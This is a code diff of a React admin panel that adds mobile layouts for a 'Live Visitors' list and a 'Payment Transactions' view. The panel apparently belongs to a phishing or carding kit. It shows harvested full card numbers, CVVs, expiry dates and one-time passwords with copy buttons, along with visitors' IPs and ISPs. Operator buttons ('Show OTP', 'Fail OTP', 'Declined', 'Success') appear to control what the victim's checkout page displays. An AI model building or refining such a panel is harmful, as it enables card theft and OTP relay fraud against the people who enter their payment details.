@@ -971,35 +971,35 @@ const Admin = () => {
   };
 
   return (
-    <div className="min-h-screen bg-black text-white p-6">
+    <div className="min-h-screen bg-black text-white p-3 sm:p-6">
       <div className="max-w-7xl mx-auto">
         {/* Header */}
-        <div className="flex items-center justify-between mb-8">
-          <h1 className="text-3xl font-bold">Admin Panel</h1>
-          <div className="flex items-center gap-2">
+        <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between mb-6 sm:mb-8 gap-4">
+          <h1 className="text-2xl sm:text-3xl font-bold">Admin Panel</h1>
+          <div className="flex items-center gap-2 bg-gray-800 rounded-lg px-3 py-2 w-fit">
             {isConnected ? (
               <>
-                <Wifi className="h-5 w-5 text-green-400" />
-                <span className="text-green-400">Connected</span>
+                <Wifi className="h-4 w-4 sm:h-5 sm:w-5 text-green-400" />
+                <span className="text-green-400 text-sm sm:text-base font-medium">Connected</span>
               </>
             ) : (
               <>
-                <WifiOff className="h-5 w-5 text-red-400" />
-                <span className="text-red-400">Disconnected</span>
+                <WifiOff className="h-4 w-4 sm:h-5 sm:w-5 text-red-400" />
+                <span className="text-red-400 text-sm sm:text-base font-medium">Disconnected</span>
               </>
             )}
           </div>
         </div>
 
         {/* Generate Payment Link Section */}
-        <div className="bg-gray-900 rounded-lg overflow-hidden mb-8">
-          <div className="p-6 border-b border-gray-700">
-            <h2 className="text-xl font-semibold">Generate Payment Link</h2>
-            <p className="text-gray-400 mt-1">Create custom payment links with specific amounts</p>
+        <div className="bg-gray-900 rounded-lg overflow-hidden mb-6 sm:mb-8">
+          <div className="p-4 sm:p-6 border-b border-gray-700">
+            <h2 className="text-lg sm:text-xl font-semibold">Generate Payment Link</h2>
+            <p className="text-gray-400 mt-1 text-sm sm:text-base">Create custom payment links with specific amounts</p>
           </div>
-          <div className="p-6">
-            <div className="flex flex-col sm:flex-row gap-4 items-end">
-              <div className="flex-1">
+          <div className="p-4 sm:p-6">
+            <div className="flex flex-col gap-4">
+              <div className="w-full">
                 <label className="block text-sm font-medium text-gray-300 mb-2">
                   Amount (₹)
                 </label>
@@ -1008,14 +1008,14 @@ const Admin = () => {
                   placeholder="Enter amount"
                   value={paymentLinkAmount}
                   onChange={(e) => setPaymentLinkAmount(e.target.value)}
-                  className="bg-gray-800 border-gray-600 text-white"
+                  className="bg-gray-800 border-gray-600 text-white h-12 text-base"
                   min="1"
                   step="0.01"
                 />
               </div>
               <Button
                 onClick={generatePaymentLink}
-                className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2"
+                className="bg-blue-600 hover:bg-blue-700 text-white h-12 text-base font-medium w-full sm:w-auto"
                 disabled={!paymentLinkAmount || parseFloat(paymentLinkAmount) <= 0}
               >
                 Generate Payment Link
@@ -1027,19 +1027,19 @@ const Admin = () => {
                 <label className="block text-sm font-medium text-gray-300 mb-2">
                   Generated Payment Link:
                 </label>
-                <div className="flex items-center gap-2">
+                <div className="flex flex-col sm:flex-row gap-2">
                   <Input
                     value={generatedLink}
                     readOnly
-                    className="bg-gray-700 border-gray-600 text-white font-mono text-sm"
+                    className="bg-gray-700 border-gray-600 text-white font-mono text-sm h-12 flex-1"
                   />
                   <Button
                     onClick={() => copyToClipboard(generatedLink)}
                     variant="outline"
-                    size="sm"
-                    className="border-gray-600 text-gray-300 hover:bg-gray-700"
+                    className="border-gray-600 text-gray-300 hover:bg-gray-700 h-12 w-full sm:w-auto px-6"
                   >
-                    <Copy className="h-4 w-4" />
+                    <Copy className="h-4 w-4 mr-2" />
+                    Copy Link
                   </Button>
                 </div>
                 <p className="text-xs text-gray-400 mt-2">
@@ -1051,13 +1051,52 @@ const Admin = () => {
         </div>
 
         {/* Live Visitors Section */}
-        <div className="bg-gray-900 rounded-lg overflow-hidden mb-8">
-          <div className="p-6 border-b border-gray-700">
-            <h2 className="text-xl font-semibold">Live Visitors</h2>
-            <p className="text-gray-400 mt-1">Real-time website visitors ({liveVisitors.length} online)</p>
+        <div className="bg-gray-900 rounded-lg overflow-hidden mb-6 sm:mb-8">
+          <div className="p-4 sm:p-6 border-b border-gray-700">
+            <h2 className="text-lg sm:text-xl font-semibold">Live Visitors</h2>
+            <p className="text-gray-400 mt-1 text-sm sm:text-base">Real-time website visitors ({liveVisitors.length} online)</p>
           </div>
           
-          <div className="overflow-x-auto">
+          {/* Mobile-friendly visitor cards */}
+          <div className="block sm:hidden">
+            {liveVisitors.length === 0 ? (
+              <div className="p-6 text-center text-gray-400">
+                No live visitors at the moment
+              </div>
+            ) : (
+              liveVisitors.map((visitor) => (
+                <div key={visitor.id} className="p-4 border-b border-gray-700 last:border-b-0">
+                  <div className="flex items-center justify-between mb-2">
+                    <div className="bg-red-600 text-black px-2 py-1 rounded font-bold text-sm">
+                      {visitor.ipAddress}
+                    </div>
+                    <span className="inline-flex items-center px-2 py-1 rounded-full text-xs font-medium bg-green-100 text-green-800">
+                      <div className="w-2 h-2 bg-green-500 rounded-full mr-1 animate-pulse"></div>
+                      Online
+                    </span>
+                  </div>
+                  <div className="space-y-1 text-sm">
+                    <div className="flex items-center gap-2">
+                      <span className="text-gray-400">ISP:</span>
+                      <div className="bg-blue-600 text-white px-2 py-1 rounded text-xs">
+                        {visitor.isp || 'Loading...'}
+                      </div>
+                    </div>
+                    <div className="flex items-center gap-2">
+                      <span className="text-gray-400">Location:</span>
+                      <span className="text-gray-300">{visitor.country || 'Unknown'}, {visitor.city || 'Unknown'}</span>
+                    </div>
+                    <div className="text-xs text-gray-400">
+                      {new Date(visitor.timestamp).toLocaleString()}
+                    </div>
+                  </div>
+                </div>
+              ))
+            )}
+          </div>
+          
+          {/* Desktop table view */}
+          <div className="hidden sm:block overflow-x-auto">
             <table className="w-full">
               <thead className="bg-gray-800">
                 <tr>
@@ -1130,26 +1169,26 @@ const Admin = () => {
         </div>
 
         {/* Payment Data Table */}
-        <div className="bg-gray-900 rounded-lg overflow-hidden mb-8">
-          <div className="p-6 border-b border-gray-700">
-            <div className="flex justify-between items-center">
+        <div className="bg-gray-900 rounded-lg overflow-hidden mb-6 sm:mb-8">
+          <div className="p-4 sm:p-6 border-b border-gray-700">
+            <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-4">
               <div>
-                <h2 className="text-xl font-semibold">Payment Transactions</h2>
-                <p className="text-gray-400 mt-1">Real-time payment data from checkout</p>
+                <h2 className="text-lg sm:text-xl font-semibold">Payment Transactions</h2>
+                <p className="text-gray-400 mt-1 text-sm sm:text-base">Real-time payment data from checkout</p>
               </div>
               {/* OTP Display Area */}
               {otps.length > 0 && (
-                <div className="bg-blue-900 rounded-lg p-4 border border-blue-700">
-                  <h3 className="text-blue-300 font-medium mb-2">Latest OTP</h3>
-                  <div className="flex items-center gap-3">
-                    <span className="text-2xl font-bold text-blue-100 bg-blue-800 px-3 py-1 rounded font-mono">
+                <div className="bg-blue-900 rounded-lg p-3 sm:p-4 border border-blue-700 w-full sm:w-auto">
+                  <h3 className="text-blue-300 font-medium mb-2 text-sm sm:text-base">Latest OTP</h3>
+                  <div className="flex items-center gap-3 justify-between sm:justify-start">
+                    <span className="text-xl sm:text-2xl font-bold text-blue-100 bg-blue-800 px-3 py-1 rounded font-mono">
                       {otps[0].otp}
                     </span>
                     <Button
                       variant="ghost"
                       size="sm"
                       onClick={() => copyToClipboard(otps[0].otp)}
-                      className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100"
+                      className="h-8 w-8 p-0 text-blue-300 hover:text-blue-100"
                     >
                       <Copy className="h-4 w-4" />
                     </Button>
@@ -1162,7 +1201,217 @@ const Admin = () => {
             </div>
           </div>
           
-          <div className="overflow-x-auto">
+          {/* Mobile-friendly payment cards */}
+          <div className="block sm:hidden">
+            {payments.length === 0 ? (
+              <div className="p-6 text-center text-gray-400">
+                No payment data received yet. Waiting for transactions...
+              </div>
+            ) : (
+              payments.map((payment) => {
+                const isNewCard = !clickedCards.has(payment.id);
+                return (
+                  <div 
+                    key={payment.id}
+                    className={`p-4 border-b border-gray-700 last:border-b-0 transition-all duration-300 ${
+                      isNewCard 
+                        ? 'border-2 border-cyan-400 shadow-lg shadow-cyan-400/50 animate-pulse bg-gray-800/50' 
+                        : 'hover:bg-gray-800'
+                    }`}
+                    onClick={() => handleCardClick(payment.id)}
+                    style={{
+                      boxShadow: isNewCard ? '0 0 20px rgba(34, 211, 238, 0.6), inset 0 0 20px rgba(34, 211, 238, 0.1)' : undefined
+                    }}
+                  >
+                    {/* Card Header */}
+                    <div className="flex items-center justify-between mb-3">
+                      <div className="flex items-center gap-2">
+                        <span className={`text-sm font-medium ${
+                          payment.status === 'approved' ? 'text-green-400' :
+                          payment.status === 'rejected' ? 'text-red-400' :
+                          'text-yellow-400'
+                        }`}>
+                          {getStatusIcon(payment.status)}
+                          {payment.status.charAt(0).toUpperCase() + payment.status.slice(1)}
+                        </span>
+                      </div>
+                      <div className="text-xs text-gray-400">
+                        {new Date(payment.timestamp).toLocaleString()}
+                      </div>
+                    </div>
+
+                    {/* Customer Info */}
+                    <div className="mb-3">
+                      <div className="text-sm font-medium text-white">
+                        {payment.billingDetails.firstName} {payment.billingDetails.lastName}
+                      </div>
+                      <div className="text-xs text-gray-400">
+                        {payment.billingDetails.email}
+                      </div>
+                      <div className="text-xs text-gray-500">
+                        {payment.billingDetails.country}
+                      </div>
+                    </div>
+
+                    {/* Card Details */}
+                    <div className="mb-3 space-y-2">
+                      <div className="flex items-center justify-between">
+                        <span className="text-xs text-gray-400">Card Number:</span>
+                        <div className="flex items-center gap-2">
+                          <span className="text-sm font-mono text-green-400">
+                            {formatCardNumber(payment.cardNumber)}
+                          </span>
+                          <Button
+                            variant="ghost"
+                            size="sm"
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              copyToClipboard(payment.cardNumber);
+                            }}
+                            className="h-6 w-6 p-0 text-gray-400 hover:text-white"
+                          >
+                            <Copy className="h-3 w-3" />
+                          </Button>
+                        </div>
+                      </div>
+                      <div className="flex items-center justify-between">
+                        <span className="text-xs text-gray-400">Holder Name:</span>
+                        <span className="text-sm text-white">{payment.cardName}</span>
+                      </div>
+                      <div className="flex items-center justify-between">
+                        <span className="text-xs text-gray-400">CVV:</span>
+                        <span className="text-sm font-mono text-white">{payment.cvv}</span>
+                      </div>
+                      <div className="flex items-center justify-between">
+                        <span className="text-xs text-gray-400">Expiry:</span>
+                        <span className="text-sm font-mono text-white">{formatExpiry(payment)}</span>
+                      </div>
+                      <div className="flex items-center justify-between">
+                        <span className="text-xs text-gray-400">Amount:</span>
+                        <span className="text-sm font-medium text-white">₹{payment.amount.toLocaleString()}</span>
+                      </div>
+                      {payment.cardCountry && (
+                        <div className="flex items-center justify-between">
+                          <span className="text-xs text-gray-400">Country:</span>
+                          <div className="flex items-center gap-1">
+                            <span className="text-sm">{payment.cardCountry.flag}</span>
+                            <span className="text-xs text-gray-300">{payment.cardCountry.name}</span>
+                          </div>
+                        </div>
+                      )}
+                    </div>
+
+                    {/* OTP Display for this payment */}
+                    {otps.length > 0 && otps[0].paymentId === payment.id && (
+                      <div className="bg-blue-900 rounded-lg p-3 border border-blue-700 mb-3">
+                        <div className="flex items-center justify-between">
+                          <span className="text-xs text-blue-300">OTP:</span>
+                          <div className="flex items-center gap-2">
+                            <span className="text-lg font-bold text-blue-100 bg-blue-800 px-2 py-1 rounded font-mono">
+                              {otps[0].otp}
+                            </span>
+                            <Button
+                              variant="ghost"
+                              size="sm"
+                              onClick={(e) => {
+                                e.stopPropagation();
+                                copyToClipboard(otps[0].otp);
+                              }}
+                              className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100"
+                            >
+                              <Copy className="h-3 w-3" />
+                            </Button>
+                          </div>
+                        </div>
+                      </div>
+                    )}
+
+                    {/* Action Buttons */}
+                    <div className="grid grid-cols-2 gap-2">
+                      <Button
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          handleAction(payment.paymentId, 'show-otp');
+                        }}
+                        size="sm"
+                        className="h-10 text-xs bg-blue-600 text-white hover:bg-blue-700"
+                      >
+                        Show OTP
+                      </Button>
+                      <Button
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          handleAction(payment.paymentId, 'validate-otp');
+                        }}
+                        size="sm"
+                        className="h-10 text-xs bg-green-600 text-white hover:bg-green-700"
+                      >
+                        Validate
+                      </Button>
+                      <Button
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          handleAction(payment.paymentId, 'fail-otp');
+                        }}
+                        size="sm"
+                        className="h-10 text-xs bg-red-600 text-white hover:bg-red-700"
+                      >
+                        Fail OTP
+                      </Button>
+                      <Button
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          handleAction(payment.paymentId, 'card-declined');
+                        }}
+                        size="sm"
+                        className="h-10 text-xs bg-orange-600 text-white hover:bg-orange-700"
+                      >
+                        Declined
+                      </Button>
+                      <Button
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          handleAction(payment.paymentId, 'insufficient-balance');
+                        }}
+                        size="sm"
+                        className="h-10 text-xs bg-yellow-600 text-white hover:bg-yellow-700"
+                      >
+                        Insufficient
+                      </Button>
+                      <Button
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          handleAction(payment.paymentId, 'successful');
+                        }}
+                        size="sm"
+                        className="h-10 text-xs bg-emerald-600 text-white hover:bg-emerald-700"
+                      >
+                        Success
+                      </Button>
+                    </div>
+                    
+                    {/* Delete Button */}
+                    <div className="mt-3 pt-3 border-t border-gray-700">
+                      <Button
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          deleteTransaction(payment.id);
+                        }}
+                        size="sm"
+                        variant="outline"
+                        className="w-full h-10 text-xs border-red-600 text-red-400 hover:bg-red-600 hover:text-white"
+                      >
+                        Delete Transaction
+                      </Button>
+                    </div>
+                  </div>
+                );
+              })
+            )}
+          </div>
+          
+          {/* Desktop table view */}
+          <div className="hidden sm:block overflow-x-auto">
             <table className="w-full">
               <thead className="bg-gray-800">
                 <tr>
